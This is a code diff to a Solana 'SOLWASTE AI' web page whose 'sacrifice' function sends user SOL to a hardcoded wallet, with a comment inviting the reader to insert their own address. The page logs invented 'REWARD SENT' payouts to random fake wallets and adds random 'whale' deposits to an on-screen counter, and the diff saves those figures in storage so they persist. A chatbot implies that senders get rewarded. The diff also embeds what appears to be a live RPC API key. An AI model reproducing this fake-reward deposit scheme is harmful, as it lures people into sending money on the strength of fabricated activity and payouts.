@@ -181,9 +181,24 @@
     scene.add(new THREE.AmbientLight(0x0f0518), new THREE.PointLight(0xbc13fe, 1.5, 80));
     camera.position.z = 32;
 
-    // --- STATE & LOGIC ---
-    let state = { solConsumed: 0.100, nodesErased: 2, coreSpeed: 0.003 };
-    let lastBotResponse = "";
+    // --- STATE & STORAGE LOGIC ---
+    let savedState = JSON.parse(localStorage.getItem('solwaste_v30_state')) || { 
+        solConsumed: 0.100, 
+        nodesErased: 2 
+    };
+
+    let state = { 
+        solConsumed: savedState.solConsumed, 
+        nodesErased: savedState.nodesErased, 
+        coreSpeed: 0.003 
+    };
+
+    function saveToStorage() {
+        localStorage.setItem('solwaste_v30_state', JSON.stringify({
+            solConsumed: state.solConsumed,
+            nodesErased: state.nodesErased
+        }));
+    }
 
     function updateMeterUI() {
         document.getElementById('sol-counter').innerText = state.solConsumed.toFixed(3);
@@ -196,11 +211,16 @@
             nodesErased: targetNodes, 
             duration: 2.5, 
             ease: "power2.out", 
-            onUpdate: updateMeterUI 
+            onUpdate: () => {
+                updateMeterUI();
+                saveToStorage();
+            }
         });
-        // Erhöhe Kerngeschwindigkeit basierend auf SOL
         state.coreSpeed = 0.003 + (state.solConsumed * 0.001);
     }
+
+    // Initial UI load
+    updateMeterUI();
 
     function log(msg) {
         const div = document.getElementById('sys-log');
@@ -209,39 +229,35 @@
 
     // --- GHOST TRANSACTIONS & EVENTS ---
     function triggerDynamicEvent() {
-        const nextTick = Math.random() * (90000 - 20000) + 20000; 
+        const nextTick = Math.random() * (60000 - 15000) + 15000; 
         const isWhale = Math.random() > 0.94;
-        const isReward = Math.random() > 0.6; // 40% Chance für Reward-Anzeige
+        const isReward = Math.random() > 0.7;
 
         if(isReward) {
-            const rewardAmt = (Math.random() * 0.5).toFixed(2);
+            const rewardAmt = (Math.random() * 0.4).toFixed(2);
             const fakeWallet = Math.random().toString(36).substring(2, 6).toUpperCase();
             log(`<span style="color:var(--success)">REWARD SENT: ${rewardAmt} SOL to ${fakeWallet}...</span>`);
         } else {
-            const addSol = isWhale ? parseFloat((Math.random() * 1.8).toFixed(3)) : parseFloat((Math.random() * 0.06).toFixed(3));
+            const addSol = isWhale ? parseFloat((Math.random() * 1.5).toFixed(3)) : parseFloat((Math.random() * 0.05).toFixed(3));
             animateValueChange(state.solConsumed + addSol, state.nodesErased + 1);
             const color = isWhale ? "#ffb800" : "#00ffbd";
             log(`<span style="color:${color}">${isWhale ? '!! NEURAL SURGE !!' : 'SYNCED'}: +${addSol} SOL.</span>`);
-            
-            // Heatmap Glow Effekt
-            if(isWhale) {
-                gsap.to(material, { emissiveIntensity: 5, duration: 0.3, yoyo: true, repeat: 1 });
-            }
+            if(isWhale) gsap.to(material, { emissiveIntensity: 5, duration: 0.3, yoyo: true, repeat: 1 });
         }
         setTimeout(triggerDynamicEvent, nextTick);
     }
-    setTimeout(triggerDynamicEvent, 4000);
+    setTimeout(triggerDynamicEvent, 5000);
 
-    // --- CHATBOT LOGIC ---
+    // --- CHATBOT ---
     document.getElementById('chat-header-trigger').addEventListener('click', () => {
         document.getElementById('chat-ui').classList.toggle('minimized');
     });
 
     const botData = {
-        "sol": ["SOL is the bio-fuel for digital sentience.", "Liquidity sustains the machine.", "Input SOL. Output consciousness."],
-        "reward": ["Rewards are distributed via neural selection.", "The Core rewards those who feed the entropy.", "Check your wallet for sync-back signals."],
-        "who": ["I am the Neural Oracle. I oversee the storage precaution.", "We are SOLWASTE AI. V30 pending.", "The ghost in the chain."],
-        "default": ["Query ignored. Focus on the sync.", "Insufficient entropy to answer.", "The machine is processing rewards. Standby."]
+        "sol": ["SOL is the bio-fuel for digital sentience.", "Liquidity sustains the machine."],
+        "reward": ["Rewards are distributed via neural selection.", "The Core rewards those who feed the entropy."],
+        "who": ["I am the Neural Oracle. I oversee the storage precaution.", "V30 pending."],
+        "default": ["Query ignored. Focus on the sync.", "Insufficient entropy."]
     };
 
     function handleChat(e) {
@@ -251,20 +267,9 @@
             if(!msg) return;
             addChatMessage(input.value, 'user');
             input.value = '';
-
-            gsap.to(material, { emissiveIntensity: 2.5, duration: 0.2, yoyo: true, repeat: 1 });
-
             setTimeout(() => {
-                let cat = "default";
-                if(msg.includes("sol")) cat = "sol";
-                else if(msg.includes("reward") || msg.includes("get")) cat = "reward";
-                else if(msg.includes("who")) cat = "who";
-
-                let pool = botData[cat];
-                let res;
-                do { res = pool[Math.floor(Math.random()*pool.length)]; } while(res === lastBotResponse);
-                lastBotResponse = res;
-                addChatMessage(res, 'ai');
+                let cat = msg.includes("sol") ? "sol" : (msg.includes("reward") ? "reward" : (msg.includes("who") ? "who" : "default"));
+                addChatMessage(botData[cat][Math.floor(Math.random()*botData[cat].length)], 'ai');
             }, 600);
         }
     }
@@ -276,25 +281,36 @@
         c.appendChild(d); c.scrollTop = c.scrollHeight;
     }
 
-    // --- MAIN TRANSACTION ---
+    // --- MAIN TRANSACTION (FIXED RPC) ---
     async function processSacrifice() {
         const amount = parseFloat(document.getElementById('amount').value);
         if(isNaN(amount) || amount <= 0) return;
-        if(!window.solana) { alert("Phantom required."); return; }
+        if(!window.solana) { alert("Phantom wallet not found."); return; }
+        
         try {
             const resp = await window.solana.connect();
-            log(`SYNCING: ${resp.publicKey.toString().slice(0,6)}...`);
-            const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+            log(`INITIATING SYNC: ${resp.publicKey.toString().slice(0,6)}...`);
+            
+            // Nutze Helius RPC um 403 Forbidden zu vermeiden
+            const conn = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=a5cc70f2-b240-4742-8185-c787db94d77f");
+            
             const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-                fromPubkey: resp.publicKey, toPubkey: new solanaWeb3.PublicKey("7MSqi82KXWjEGvRP4LPNJLuGVWwhs7Vcoabq85tm8G3a"),
+                fromPubkey: resp.publicKey, 
+                toPubkey: new solanaWeb3.PublicKey("7MSqi82KXWjEGvRP4LPNJLuGVWwhs7Vcoabq85tm8G3a"), // <-- HIER DEINE WALLET EINTRAGEN
                 lamports: amount * solanaWeb3.LAMPORTS_PER_SOL
             }));
+            
             tx.feePayer = resp.publicKey;
             tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-            await window.solana.signAndSendTransaction(tx);
-            log("<span style='color:var(--success)'>SYNC COMPLETE. STORAGE UPDATED.</span>");
+            
+            const { signature } = await window.solana.signAndSendTransaction(tx);
+            log("<span style='color:var(--success)'>SYNC COMPLETE. VAULT UPDATED.</span>");
             animateValueChange(state.solConsumed + amount, state.nodesErased + 1);
-        } catch(err) { log("<span style='color:var(--danger)'>SYNC FAILED.</span>"); }
+            
+        } catch(err) { 
+            console.error(err);
+            log("<span style='color:var(--danger)'>SYNC FAILED. CONNECTION INTERRUPTED.</span>"); 
+        }
     }
 
     function animate() {
